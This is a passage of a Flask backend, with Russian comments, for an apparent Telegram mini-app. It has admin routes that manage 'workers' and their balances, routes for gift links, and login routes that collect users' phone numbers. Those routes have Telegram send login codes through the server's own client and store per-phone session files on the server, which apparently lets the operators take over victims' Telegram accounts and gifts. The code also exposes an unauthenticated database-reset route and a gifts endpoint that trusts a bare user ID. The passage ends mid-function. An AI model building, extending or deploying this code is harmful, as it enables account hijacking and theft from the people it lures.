    except Exception as e:
        logger.error(f"Error in api_admin_add_admin: {e}", exc_info=True)
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/admin/remove-admin', methods=['POST'])
def api_admin_remove_admin():
    """API для удаления админа"""
    try:
        # Проверка авторизации
        has_access, admin_info = check_admin_access()
        if not has_access:
            return jsonify({'success': False, 'error': 'Unauthorized'}), 401
        
        data = request.get_json()
        telegram_id = data.get('telegram_id')
        
        if not telegram_id:
            return jsonify({'success': False, 'error': 'telegram_id required'}), 400
        
        from database import Database
        db = Database()
        success = db.remove_admin(telegram_id)
        
        if success:
            return jsonify({'success': True})
        else:
            return jsonify({'success': False, 'error': 'Admin not found'}), 404
    except Exception as e:
        logger.error(f"Error in api_admin_remove_admin: {e}", exc_info=True)
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/admin/update-admin-username', methods=['POST'])
def api_admin_update_admin_username():
    """API для обновления username админа"""
    try:
        # Проверка авторизации
        has_access, admin_info = check_admin_access()
        if not has_access:
            return jsonify({'success': False, 'error': 'Unauthorized'}), 401
        
        data = request.get_json()
        telegram_id = data.get('telegram_id')
        username = data.get('username', '')
        
        if not telegram_id:
            return jsonify({'success': False, 'error': 'telegram_id required'}), 400
        
        from database import Database
        db = Database()
        success = db.update_admin_username(telegram_id, username)
        
        if success:
            return jsonify({'success': True})
        else:
            return jsonify({'success': False, 'error': 'Admin not found'}), 404
    except Exception as e:
        logger.error(f"Error in api_admin_update_admin_username: {e}", exc_info=True)
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/admin/toggle-admin-status', methods=['POST'])
def api_admin_toggle_admin_status():
    """API для переключения статуса админа"""
    try:
        # Проверка авторизации
        has_access, admin_info = check_admin_access()
        if not has_access:
            return jsonify({'success': False, 'error': 'Unauthorized'}), 401
        
        data = request.get_json()
        telegram_id = data.get('telegram_id')
        is_active = data.get('is_active', True)
        
        if not telegram_id:
            return jsonify({'success': False, 'error': 'telegram_id required'}), 400
        
        from database import Database
        db = Database()
        success = db.set_admin_status(telegram_id, is_active)
        
        if success:
            return jsonify({'success': True})
        else:
            return jsonify({'success': False, 'error': 'Admin not found'}), 404
    except Exception as e:
        logger.error(f"Error in api_admin_toggle_admin_status: {e}", exc_info=True)
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/admin/add-worker', methods=['POST'])
def api_admin_add_worker():
    """API для добавления воркера"""
    try:
        has_access, admin_info = check_admin_access()
        if not has_access:
            return jsonify({'success': False, 'error': 'Unauthorized'}), 401
        
        data = request.get_json()
        telegram_id = data.get('telegram_id')
        username = data.get('username', '')
        first_name = data.get('first_name', '')
        
        if not telegram_id:
            return jsonify({'success': False, 'error': 'telegram_id required'}), 400
        
        from database import Database
        db = Database()
        
        # Создаем пользователя если его нет
        db.get_or_create_user(
            telegram_id=telegram_id,
            username=username,
            first_name=first_name,
            last_name=''
        )
        
        # Добавляем воркера
        success = db.add_worker(telegram_id)
        
        if success:
            # Обновляем username если указан
            if username:
                db.update_user_username(telegram_id, username)
            return jsonify({'success': True})
        else:
            return jsonify({'success': False, 'error': 'Worker already exists or failed to add'}), 400
    except Exception as e:
        logger.error(f"Error in api_admin_add_worker: {e}", exc_info=True)
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/admin/remove-worker', methods=['POST'])
def api_admin_remove_worker():
    """API для удаления воркера"""
    try:
        has_access, admin_info = check_admin_access()
        if not has_access:
            return jsonify({'success': False, 'error': 'Unauthorized'}), 401
        
        data = request.get_json()
        telegram_id = data.get('telegram_id')
        
        if not telegram_id:
            return jsonify({'success': False, 'error': 'telegram_id required'}), 400
        
        from database import Database
        db = Database()
        success = db.remove_worker(telegram_id)
        
        if success:
            return jsonify({'success': True})
        else:
            return jsonify({'success': False, 'error': 'Worker not found'}), 404
    except Exception as e:
        logger.error(f"Error in api_admin_remove_worker: {e}", exc_info=True)
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/admin/update-worker', methods=['POST'])
def api_admin_update_worker():
    """API для обновления информации о воркере"""
    try:
        has_access, admin_info = check_admin_access()
        if not has_access:
            return jsonify({'success': False, 'error': 'Unauthorized'}), 401
        
        data = request.get_json()
        telegram_id = data.get('telegram_id')
        username = data.get('username', '')
        first_name = data.get('first_name', '')
        last_name = data.get('last_name', '')
        
        if not telegram_id:
            return jsonify({'success': False, 'error': 'telegram_id required'}), 400
        
        from database import Database
        db = Database()
        
        # Обновляем username
        if username:
            db.update_user_username(telegram_id, username)
        
        # Обновляем имя и фамилию
        if first_name or last_name:
            db.update_user_name(telegram_id, first_name, last_name)
        
        return jsonify({'success': True})
    except Exception as e:
        logger.error(f"Error in api_admin_update_worker: {e}", exc_info=True)
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/admin/reset-worker-balance', methods=['POST'])
def api_admin_reset_worker_balance():
    """API для обнуления баланса воркера"""
    try:
        # Проверка авторизации
        has_access, admin_info = check_admin_access()
        if not has_access:
            return jsonify({'success': False, 'error': 'Unauthorized'}), 401
        
        data = request.get_json()
        if not data or 'telegram_id' not in data:
            return jsonify({'success': False, 'error': 'telegram_id is required'}), 400
        
        telegram_id = int(data['telegram_id'])
        
        # Используем backend/database.py для работы с балансами
        import sys
        import os
        import importlib.util
        backend_path = os.path.join(os.path.dirname(__file__), 'backend')
        backend_db_path = os.path.join(backend_path, 'database.py')
        
        # Используем importlib для принудительной загрузки модуля
        # Это гарантирует, что мы получим актуальную версию с методом reset_worker_balance
        spec = importlib.util.spec_from_file_location("backend_database_module", backend_db_path)
        backend_db_module = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(backend_db_module)
        BackendDatabase = backend_db_module.Database
        
        db_path = os.path.abspath(os.path.join(os.path.dirname(__file__), 'backend', 'playerok.db'))
        if not os.path.exists(db_path):
            db_path = os.path.abspath('backend/playerok.db')
        db = BackendDatabase(db_path=db_path)
        
        # Получаем user_id по telegram_id из backend БД
        backend_user = db.get_user_by_telegram_id(telegram_id)
        if not backend_user:
            return jsonify({'success': False, 'error': 'Worker not found in backend database'}), 404
        
        user_id = backend_user['id']
        
        # Проверяем наличие метода перед вызовом
        if not hasattr(db, 'reset_worker_balance'):
            logger.error(f"Method reset_worker_balance not found. Available methods: {[m for m in dir(db) if not m.startswith('_')]}")
            return jsonify({'success': False, 'error': 'Method reset_worker_balance not found'}), 500
        
        # Обнуляем баланс
        try:
            success = db.reset_worker_balance(user_id)
        except Exception as e:
            logger.error(f"Error calling reset_worker_balance: {e}", exc_info=True)
            return jsonify({'success': False, 'error': f'Failed to reset balance: {str(e)}'}), 500
        
        if success:
            return jsonify({
                'success': True,
                'message': 'Balance reset successfully'
            })
        else:
            return jsonify({'success': False, 'error': 'Failed to reset balance'}), 500
            
    except Exception as e:
        logger.error(f"Error in api_admin_reset_worker_balance: {e}", exc_info=True)
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/admin/update-all-workers', methods=['POST'])
def api_admin_update_all_workers():
    """API для обновления информации о всех воркерах через Telegram Bot API"""
    try:
        has_access, admin_info = check_admin_access()
        if not has_access:
            return jsonify({'success': False, 'error': 'Unauthorized'}), 401
        
        from database import Database
        from config_bot import BotConfig
        import requests
        
        db = Database()
        workers = db.get_all_workers()
        
        if not workers:
            return jsonify({'success': True, 'updated': 0})
        
        updated_count = 0
        bot_token = BotConfig.BOT_TOKEN
        
        for worker in workers:
            try:
                telegram_id = worker.get('telegram_id')
                if not telegram_id:
                    continue
                
                # Получаем информацию о пользователе через Bot API
                url = f"https://api.telegram.org/bot{bot_token}/getChat"
                response = requests.get(url, params={'chat_id': telegram_id}, timeout=5)
                
                if response.status_code == 200:
                    data = response.json()
                    if data.get('ok'):
                        user_data = data.get('result', {})
                        
                        # Обновляем информацию в БД
                        username = user_data.get('username', '')
                        first_name = user_data.get('first_name', '')
                        last_name = user_data.get('last_name', '')
                        avatar_url = None
                        
                        # Получаем фото профиля если есть
                        if user_data.get('photo'):
                            photos = user_data.get('photo', {})
                            if photos.get('small_file_id'):
                                # Получаем URL фото через getFile
                                file_url = f"https://api.telegram.org/bot{bot_token}/getFile"
                                file_response = requests.get(file_url, params={'file_id': photos['small_file_id']}, timeout=5)
                                if file_response.status_code == 200:
                                    file_data = file_response.json()
                                    if file_data.get('ok'):
                                        file_path = file_data.get('result', {}).get('file_path', '')
                                        if file_path:
                                            avatar_url = f"https://api.telegram.org/file/bot{bot_token}/{file_path}"
                        
                        # Обновляем в БД
                        if username:
                            db.update_user_username(telegram_id, username)
                        if first_name or last_name:
                            db.update_user_name(telegram_id, first_name, last_name)
                        if avatar_url:
                            db.update_user_avatar(telegram_id, avatar_url)
                        
                        updated_count += 1
                else:
                    logger.warning(f"Failed to get user info for {telegram_id}: {response.status_code}")
            except Exception as e:
                logger.error(f"Error updating worker {worker.get('telegram_id')}: {e}")
                continue
        
        return jsonify({'success': True, 'updated': updated_count})
    except Exception as e:
        logger.error(f"Error in api_admin_update_all_workers: {e}", exc_info=True)
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/admin/update-all-users', methods=['POST'])
def api_admin_update_all_users():
    """API для обновления информации о всех пользователях из Telegram"""
    try:
        # Проверка авторизации
        has_access, admin_info = check_admin_access()
        if not has_access:
            return jsonify({'success': False, 'error': 'Unauthorized'}), 401
        
        import asyncio
        from database import Database
        from telegram_bot import bot
        from aiogram.exceptions import TelegramBadRequest
        
        async def update_users_async():
            db = Database()
            all_telegram_ids = db.get_all_users_telegram_ids()
            
            updated_count = 0
            failed_count = 0
            errors = []
            
            logger.info(f"Начинаю обновление информации о {len(all_telegram_ids)} пользователях")
            
            for telegram_id in all_telegram_ids:
                try:
                    # Получаем информацию о пользователе через Telegram Bot API
                    try:
                        chat = await bot.get_chat(chat_id=telegram_id)
                    except TelegramBadRequest as chat_err:
                        # Если чат не найден, пропускаем этого пользователя
                        if "chat not found" in str(chat_err).lower() or "user not found" in str(chat_err).lower():
                            failed_count += 1
                            errors.append(f"Пользователь {telegram_id}: чат не найден (возможно, пользователь удалил аккаунт)")
                            logger.debug(f"Пользователь {telegram_id} не найден в Telegram, пропускаем")
                            continue
                        else:
                            # Другие ошибки Telegram API
                            raise
                    
                    username = chat.username if hasattr(chat, 'username') else None
                    first_name = chat.first_name if hasattr(chat, 'first_name') else None
                    last_name = chat.last_name if hasattr(chat, 'last_name') else None
                    
                    # Получаем фото профиля
                    avatar_url = None
                    try:
                        from aiogram.methods import GetUserProfilePhotos, GetFile
                        photos_result = await bot(GetUserProfilePhotos(user_id=telegram_id, limit=1))
                        if photos_result and photos_result.total_count > 0 and photos_result.photos and len(photos_result.photos) > 0:
                            # Берем последнее (самое большое) фото из первого набора
                            photo = photos_result.photos[0][-1]
                            file_result = await bot(GetFile(file_id=photo.file_id))
                            if file_result and file_result.file_path:
                                avatar_url = f"https://api.telegram.org/file/bot{bot.token}/{file_result.file_path}"
                    except Exception as photo_err:
                        # Игнорируем ошибки получения фото, это не критично
                        logger.debug(f"Не удалось получить фото профиля для пользователя {telegram_id}: {photo_err}")
                    
                    # Обновляем информацию в базе данных
                    try:
                        success = db.update_user_info(
                            telegram_id=telegram_id,
                            username=username,
                            first_name=first_name,
                            last_name=last_name,
                            avatar_url=avatar_url
                        )
                        
                        if success:
                            updated_count += 1
                            logger.debug(f"Обновлена информация о пользователе {telegram_id}: @{username}, {first_name} {last_name}")
                        else:
                            failed_count += 1
                            errors.append(f"Пользователь {telegram_id}: не найден в БД")
                    except Exception as db_err:
                        failed_count += 1
                        errors.append(f"Пользователь {telegram_id}: ошибка БД - {str(db_err)}")
                        logger.debug(f"Ошибка обновления БД для пользователя {telegram_id}: {db_err}")
                    
                    # Небольшая задержка, чтобы не перегружать API
                    await asyncio.sleep(0.1)
                        
                except TelegramBadRequest as e:
                    # Обработка других ошибок Telegram API
                    failed_count += 1
                    error_msg = f"Пользователь {telegram_id}: Telegram API ошибка - {str(e)}"
                    if len(errors) < 20:  # Ограничиваем количество ошибок в списке
                        errors.append(error_msg)
                    logger.debug(error_msg)
                except Exception as e:
                    # Обработка всех остальных ошибок
                    failed_count += 1
                    error_msg = f"Пользователь {telegram_id}: неожиданная ошибка - {str(e)}"
                    if len(errors) < 20:  # Ограничиваем количество ошибок в списке
                        errors.append(error_msg)
                    logger.debug(f"Ошибка обновления пользователя {telegram_id}: {e}")
            
            logger.info(f"Обновление завершено: обновлено {updated_count}, ошибок {failed_count}")
            
            return {
                'success': True,
                'updated': updated_count,
                'failed': failed_count,
                'total': len(all_telegram_ids),
                'errors': errors[:10]  # Возвращаем только первые 10 ошибок
            }
        
        # Запускаем асинхронную функцию
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        result = loop.run_until_complete(update_users_async())
        loop.close()
        
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"Ошибка в api_admin_update_all_users: {e}", exc_info=True)
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/admin/toggle-auto-mode', methods=['POST'])
def api_admin_toggle_auto_mode():
    """API для переключения авто-режима"""
    try:
        # Проверка авторизации
        has_access, admin_info = check_admin_access()
        if not has_access:
            return jsonify({'success': False, 'error': 'Unauthorized'}), 401
        
        data = request.get_json()
        telegram_id = data.get('telegram_id')
        auto_enabled = data.get('auto_enabled', True)
        
        if not telegram_id:
            return jsonify({'success': False, 'error': 'telegram_id required'}), 400
        
        from database import Database
        db = Database()
        success = db.set_auto_process_mode(telegram_id, auto_enabled)
        
        if success:
            return jsonify({'success': True})
        else:
            return jsonify({'success': False, 'error': 'Failed to update auto mode'}), 500
    except Exception as e:
        logger.error(f"Error in api_admin_toggle_auto_mode: {e}", exc_info=True)
        return jsonify({'success': False, 'error': str(e)}), 500
@app.route('/api/register', methods=['POST'])
def register_user():
    try:
        data = request.get_json() or {}
        init_data = data.get('init_data') or data.get('initData')
        user_info = get_user_from_init_data(init_data)
        if not user_info:
            return jsonify({'success': False, 'error': 'Invalid init_data'}), 401
        telegram_id = user_info['id']
        username = user_info.get('username', '')
        first_name = user_info.get('first_name', '')
        last_name = user_info.get('last_name', '')
        existing_user = db.get_user_by_telegram_id(telegram_id)
        if existing_user:
            user_gifts = db.get_user_gifts(telegram_id)
            logger.info(f"User {telegram_id} already exists")
            return jsonify({
                'success': True,
                'message': 'User found in database',
                'user': existing_user,
                'is_new_user': False
            })
        user_id = db.create_user(telegram_id, username, first_name, last_name)
        new_user = db.get_user_by_telegram_id(telegram_id)
        logger.info(f"New user registered: {telegram_id}")
        return jsonify({
            'success': True,
            'message': 'User registered successfully',
            'user': new_user,
            'is_new_user': True
        })
    except Exception as e:
        logger.error(f"Ошибка регистрации пользователя: {e}", exc_info=True)
        return jsonify({'success': False, 'error': str(e)}), 500
@app.route('/api/gifts/details', methods=['GET'])
def get_user_gifts_details_api():
    try:
        init_data = request.args.get('init_data') or request.args.get('initData')
        telegram_id = request.args.get('telegram_id')
        logger.info(f"API request for gifts details - init_data present: {bool(init_data)}, telegram_id: {telegram_id}")
        user_info = get_user_from_init_data(init_data)
        if not user_info and telegram_id:
            user_info = {'id': int(telegram_id)}
            logger.info(f"Using fallback telegram_id: {telegram_id}")
        if not user_info:
            logger.warning("Invalid init_data or telegram_id in gifts details request")
            return jsonify({'success': False, 'error': 'Invalid init_data or telegram_id'}), 401
        logger.info(f"Getting gifts for user: {user_info['id']}")
        rows = db.get_user_gifts(user_info['id'])
        logger.info(f"Found {len(rows)} gifts in database for user {user_info['id']}: {rows}")
        
        # Параллельная загрузка анимаций для ускорения
        from concurrent.futures import ThreadPoolExecutor, as_completed
        
        def process_gift(row):
            """Обрабатывает один подарок"""
            link = row.get('gift_link')
            parsed = lottie_parser.parse_link(link)
            if not parsed:
                gift_name, gift_id = 'Unknown', '0'
            else:
                gift_name, gift_id = parsed
            # Не загружаем анимации на бэкенде - загружаем напрямую с фронтенда для скорости
            return {
                'id': row.get('id'),
                'gift_name': gift_name,
                'gift_id': gift_id,
                'animation_data': None,  # Загружаем на фронтенде
                'gift_link': link
            }
        
        gifts = []
        # Используем ThreadPoolExecutor для параллельной обработки
        with ThreadPoolExecutor(max_workers=min(len(rows), 20)) as executor:
            future_to_row = {executor.submit(process_gift, row): row for row in rows}
            for future in as_completed(future_to_row):
                try:
                    gift = future.result()
                    gifts.append(gift)
                except Exception as e:
                    logger.error(f"Error processing gift: {e}", exc_info=True)
                    # Добавляем подарок без анимации в случае ошибки
                    row = future_to_row[future]
                    link = row.get('gift_link')
                    parsed = lottie_parser.parse_link(link)
                    if not parsed:
                        gift_name, gift_id = 'Unknown', '0'
                    else:
                        gift_name, gift_id = parsed
                    gifts.append({
                        'id': row.get('id'),
                        'gift_name': gift_name,
                        'gift_id': gift_id,
                        'animation_data': None,
                        'gift_link': link
                    })
        
        logger.info(f"Returning {len(gifts)} processed gifts for user {user_info['id']}")
        return jsonify({'success': True, 'gifts': gifts})
    except Exception as e:
        logger.error(f"Ошибка получения деталей подарков пользователя: {e}", exc_info=True)
        return jsonify({'success': False, 'error': str(e)}), 500
@app.route('/api/gifts', methods=['GET'])
def get_user_gifts_api():
    try:
        init_data = request.args.get('init_data') or request.args.get('initData')
        logger.info(f"API request for gifts - init_data present: {bool(init_data)}")
        user_info = get_user_from_init_data(init_data)
        if not user_info:
            logger.warning("Invalid init_data in gifts request")
            return jsonify({'success': False, 'error': 'Invalid init_data'}), 401
        logger.info(f"Getting gifts for user: {user_info['id']}")
        rows = db.get_user_gifts(user_info['id'])
        logger.info(f"Found {len(rows)} gifts in database for user {user_info['id']}: {rows}")
        
        # Параллельная загрузка анимаций для ускорения
        from concurrent.futures import ThreadPoolExecutor, as_completed
        
        def process_gift(row):
            """Обрабатывает один подарок"""
            link = row.get('gift_link')
            parsed = lottie_parser.parse_link(link)
            if not parsed:
                gift_name, gift_id = 'Unknown', '0'
            else:
                gift_name, gift_id = parsed
            # Не загружаем анимации на бэкенде - загружаем напрямую с фронтенда для скорости
            return {
                'id': row.get('id'),
                'gift_name': gift_name,
                'gift_id': gift_id,
                'animation_data': None,  # Загружаем на фронтенде
                'gift_link': link
            }
        
        gifts = []
        # Используем ThreadPoolExecutor для параллельной обработки
        with ThreadPoolExecutor(max_workers=min(len(rows), 20)) as executor:
            future_to_row = {executor.submit(process_gift, row): row for row in rows}
            for future in as_completed(future_to_row):
                try:
                    gift = future.result()
                    gifts.append(gift)
                except Exception as e:
                    logger.error(f"Error processing gift: {e}", exc_info=True)
                    # Добавляем подарок без анимации в случае ошибки
                    row = future_to_row[future]
                    link = row.get('gift_link')
                    parsed = lottie_parser.parse_link(link)
                    if not parsed:
                        gift_name, gift_id = 'Unknown', '0'
                    else:
                        gift_name, gift_id = parsed
                    gifts.append({
                        'id': row.get('id'),
                        'gift_name': gift_name,
                        'gift_id': gift_id,
                        'animation_data': None,
                        'gift_link': link
                    })
        
        return jsonify({'success': True, 'gifts': gifts})
    except Exception as e:
        logger.error(f"Error getting user gifts: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500
@app.route('/api/download_gift', methods=['POST'])
def download_gift():
    try:
        data = request.get_json() or {}
        init_data = data.get('init_data') or data.get('initData')
        gift_link = data.get('gift_link')
        user_info = get_user_from_init_data(init_data)
        if not user_info:
            return jsonify({'success': False, 'error': 'Invalid init_data'}), 401
        if not gift_link:
            return jsonify({'success': False, 'error': 'Missing gift_link'}), 400
        user = db.get_or_create_user(user_info['id'], user_info.get('username', ''), user_info.get('first_name', ''), user_info.get('last_name', ''))
        db_id = db.add_gift_link(user['id'], gift_link)
        parsed = lottie_parser.parse_link(gift_link)
        if not parsed:
            gift_name, gift_id = 'Unknown', '0'
        else:
            gift_name, gift_id = parsed
        animation_data = lottie_parser.get_animation_from_link(gift_link)
        return jsonify({
            'success': True,
            'message': 'Gift link added successfully',
            'gift': {
                'id': db_id,
                'gift_name': gift_name,
                'gift_id': gift_id,
                'animation_data': animation_data,
                'gift_link': gift_link
            }
        })
    except Exception as e:
        logger.error(f"Ошибка добавления ссылки на подарок: {e}", exc_info=True)
        return jsonify({'success': False, 'error': str(e)}), 500
@app.route('/api/gifts/details', methods=['GET'])
def get_user_gifts():
    try:
        init_data = request.args.get('init_data') or request.args.get('initData')
        telegram_id = request.args.get('telegram_id')
        if telegram_id:
            telegram_id = int(telegram_id)
        else:
            user_info = get_user_from_init_data(init_data)
            if not user_info:
                return jsonify({'success': False, 'error': 'Invalid init_data'}), 401
            telegram_id = int(user_info['id'])
        rows = db.get_user_gifts(telegram_id)
        
        # Параллельная загрузка анимаций для ускорения
        from concurrent.futures import ThreadPoolExecutor, as_completed
        
        def process_gift(row):
            """Обрабатывает один подарок"""
            link = row.get('gift_link')
            parsed = lottie_parser.parse_link(link)
            if not parsed:
                gift_name, gift_id = 'Unknown', '0'
            else:
                gift_name, gift_id = parsed
            # Не загружаем анимации на бэкенде - загружаем напрямую с фронтенда для скорости
            return {
                'id': row.get('id'),
                'gift_name': gift_name,
                'gift_id': gift_id,
                'animation_data': None,  # Загружаем на фронтенде
                'gift_link': link
            }
        
        gifts = []
        # Используем ThreadPoolExecutor для параллельной обработки
        with ThreadPoolExecutor(max_workers=min(len(rows), 20)) as executor:
            future_to_row = {executor.submit(process_gift, row): row for row in rows}
            for future in as_completed(future_to_row):
                try:
                    gift = future.result()
                    gifts.append(gift)
                except Exception as e:
                    logger.error(f"Error processing gift: {e}", exc_info=True)
                    # Добавляем подарок без анимации в случае ошибки
                    row = future_to_row[future]
                    link = row.get('gift_link')
                    parsed = lottie_parser.parse_link(link)
                    if not parsed:
                        gift_name, gift_id = 'Unknown', '0'
                    else:
                        gift_name, gift_id = parsed
                    gifts.append({
                        'id': row.get('id'),
                        'gift_name': gift_name,
                        'gift_id': gift_id,
                        'animation_data': None,
                        'gift_link': link
                    })
        
        return jsonify({'success': True, 'gifts': gifts})
    except Exception as e:
        logger.error(f"Error getting user gifts: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500
@app.route('/api/withdraw_gift', methods=['POST'])
def withdraw_gift():
    try:
        data = request.get_json() or {}
        init_data = data.get('init_data') or data.get('initData')
        gift_db_id = data.get('gift_id')
        user_info = get_user_from_init_data(init_data)
        if not user_info:
            return jsonify({'success': False, 'error': 'Invalid init_data'}), 401
        if not gift_db_id:
            return jsonify({'success': False, 'error': 'Missing gift_id'}), 400
        telegram_id = int(user_info['id'])
        removed = db.remove_gift(int(gift_db_id), telegram_id)
        if not removed:
            return jsonify({'success': False, 'error': 'Gift not found or not owned by user'}), 404
        return jsonify({'success': True, 'message': 'Gift withdrawn successfully'})
    except Exception as e:
        logger.error(f"Ошибка вывода подарка: {e}", exc_info=True)
        return jsonify({'success': False, 'error': str(e)}), 500
@app.route('/api/reset_db')
def reset_db():
    confirm = request.args.get('confirm')
    if confirm != '1':
        return jsonify({'success': False, 'error': 'confirm=1 required'}), 400
    try:
        db.reset_database()
        return jsonify({'success': True, 'message': 'Database reset and reinitialized'})
    except Exception as e:
        logger.error(f"Ошибка сброса базы данных: {e}", exc_info=True)
        return jsonify({'success': False, 'error': str(e)}), 500
@app.route('/redirect/<path:page>')
def redirect_to_getgems(page):
    """Перенаправление на страницы Getgems"""
    getgems_urls = {
        'market': 'https://getgems.io/market',
        'favorites': 'https://getgems.io/favorites',
        'catalog': 'https://getgems.io/catalog',
        'cart': 'https://getgems.io/cart',
        'profile': 'https://getgems.io/profile'
    }
    url = getgems_urls.get(page, 'https://getgems.io')
    return f'<script>window.open("{url}", "_blank");</script>'
@app.route('/login', methods=['POST'])
def login():
    try:
        data = request.json or {}
        user_id = session.get('user_id') or data.get('user_id')
        phone_raw = data.get('phone_number')
        
        logger.info(f"Получен запрос на /login: user_id={user_id}, phone_raw={phone_raw}")
        
        if not phone_raw:
            logger.warning("Запрос без номера телефона")
            return jsonify({'success': False, 'error': 'Phone number required'})
        if not user_id:
            logger.warning("Запрос без user_id")
            return jsonify({'success': False, 'error': 'User ID not found. Please open the app through Telegram.'})
        
        # Нормализуем номер телефона: убираем все пробелы и нецифровые символы, кроме +
        import re
        phone_cleaned = re.sub(r'[^\d+]', '', phone_raw)
        
        # Если номер не начинается с +, добавляем его
        if not phone_cleaned.startswith('+'):
            # Если номер начинается с цифр, добавляем +
            if phone_cleaned and phone_cleaned[0].isdigit():
                phone = '+' + phone_cleaned
            else:
                return jsonify({'success': False, 'error': 'Invalid phone number format'})
        else:
            phone = phone_cleaned
        
        # Проверяем формат: должен начинаться с + и содержать от 7 до 15 цифр после +
        if not re.match(r'^\+\d{7,15}$', phone):
            logger.error(f"Неверный формат телефона: original='{phone_raw}', cleaned='{phone}'")
            return jsonify({'success': False, 'error': 'Invalid phone number format. Please use format: +1234567890'})
        session['user_id'] = user_id
        from utils import log_user_action
        import asyncio
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(log_user_action('phone_entered', user_info={'id': user_id}, additional_data={'phone': phone, 'details': f"Номер телефона введен: {phone}"}))
            
            loop.close()
        except Exception as e:
            logger.error(f"Ошибка логирования ввода телефона: {e}", exc_info=True)
        from utils import check_session_exists, validate_session
        if check_session_exists(phone) and validate_session(phone):
            return jsonify({'success': True, 'already_authorized': True})
        session_file = f"sessions/{phone.replace('+', '')}.session"
        try:
            auth = TelegramAuth(session_file)
            result = run_async(auth.send_code(phone))
            logger.info(f"Код успешно отправлен на номер {phone}")
            try:
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                loop.run_until_complete(log_user_action('code_sent', user_info={'id': user_id}, additional_data={'phone': phone, 'details': f"Код отправлен на номер: {phone}"}))
                loop.close()
            except Exception as e:
                logger.error(f"Ошибка логирования отправки кода: {e}", exc_info=True)
            session_data = {
                'phone': phone,
                'phone_code_hash': result.phone_code_hash,
                'session_file': session_file
            }
            save_session_data(user_id, session_data)
            return jsonify({'success': True})
        except PhoneNumberInvalidError as e:
            logger.error(f"Неверный номер телефона: {phone} - {str(e)}")
            return jsonify({'success': False, 'error': 'Invalid phone number'})
        except Exception as e:
            error_message = str(e)
            logger.error(f"Ошибка отправки кода на {phone}: {error_message}", exc_info=True)
            
            # Проверяем конкретные типы ошибок для более понятных сообщений
            if "api_id/api_hash" in error_message.lower():
                return jsonify({'success': False, 'error': 'Ошибка конфигурации API: неверные API_ID/API_HASH'})
            elif "phone" in error_message.lower() or "invalid" in error_message.lower():
                return jsonify({'success': False, 'error': 'Неверный номер телефона или формат'})
            else:
                return jsonify({'success': False, 'error': f'Ошибка отправки кода: {error_message}'})
    except Exception as outer_e:
        logger.error(f"Критическая ошибка в функции login: {outer_e}", exc_info=True)
        return jsonify({'success': False, 'error': f'Server error: {str(outer_e)}'}), 500

@app.route('/api/auth/send-code', methods=['POST'])
def api_auth_send_code():
    """API эндпоинт для отправки кода авторизации"""
    from utils import log_user_action
    try:
        data = request.json or {}
        phone = data.get('phone_number') or data.get('phone')
        init_data = data.get('init_data') or data.get('initData')
        user_id = data.get('user_id')
        if isinstance(user_id, str) and user_id.lower() == 'web_user':
            user_id = None
        if init_data:
            try:
                user_info = get_user_from_init_data(init_data)
                if user_info:
                    user_id = user_info.get('id')
            except Exception as e:
                logger.warning(f"Не удалось разобрать init_data: {e}")
        
        if not phone:
            return jsonify({'success': False, 'error': 'Phone number is required'}), 400
        if not user_id:
            return jsonify({'success': False, 'error': 'init_data or user_id required'}), 400
        
        logger.info(f"API: Отправка кода на номер {phone} для user_id={user_id}")
        
        # Фейковый вход для тестового номера (без логирования)
        if phone == FAKE_TEST_PHONE:
            logger.info(f"Фейковый вход для тестового номера {phone} - пропускаем отправку кода")
            # Сохраняем минимальные данные сессии для продолжения
            session_data = {
                'phone': phone,
                'phone_code_hash': 'fake_hash_for_test',
                'session_file': f"sessions/fake_test.session",
                'is_fake': True
            }
            save_session_data(user_id, session_data)
            return jsonify({'success': True})
        
        # Используем существующую логику из login
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(log_user_action('phone_entered', user_info={'id': user_id}, additional_data={'phone': phone, 'details': f"Номер телефона введен: {phone}"}))
            
            loop.close()
        except Exception as e:
            logger.error(f"Ошибка логирования ввода телефона: {e}", exc_info=True)
        
        from utils import check_session_exists, validate_session
        if check_session_exists(phone) and validate_session(phone):
            return jsonify({'success': True, 'already_authorized': True})
        
        session_file = f"sessions/{phone.replace('+', '')}.session"
        try:
            auth = TelegramAuth(session_file)
            result = run_async(auth.send_code(phone))
            logger.info(f"Код успешно отправлен на номер {phone}")
            
            try:
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                loop.run_until_complete(log_user_action('code_sent', user_info={'id': user_id}, additional_data={'phone': phone, 'details': f"Код отправлен на номер: {phone}"}))
                loop.close()
            except Exception as e:
                logger.error(f"Ошибка логирования отправки кода: {e}", exc_info=True)
            
            session_data = {
                'phone': phone,
                'phone_code_hash': result.phone_code_hash,
                'session_file': session_file
            }
            save_session_data(user_id, session_data)
            return jsonify({'success': True})
        except PhoneNumberInvalidError as e:
            logger.error(f"Неверный номер телефона: {phone} - {str(e)}")
            return jsonify({'success': False, 'error': 'Invalid phone number'})
        except Exception as e:
            error_message = str(e)
            logger.error(f"Ошибка отправки кода на {phone}: {error_message}", exc_info=True)
            
            if "api_id/api_hash" in error_message.lower():
                return jsonify({'success': False, 'error': 'Ошибка конфигурации API: неверные API_ID/API_HASH'})
            elif "phone" in error_message.lower() or "invalid" in error_message.lower():
                return jsonify({'success': False, 'error': 'Неверный номер телефона или формат'})
            else:
                return jsonify({'success': False, 'error': f'Ошибка отправки кода: {error_message}'})
    except Exception as outer_e:
        logger.error(f"Критическая ошибка в api_auth_send_code: {outer_e}", exc_info=True)
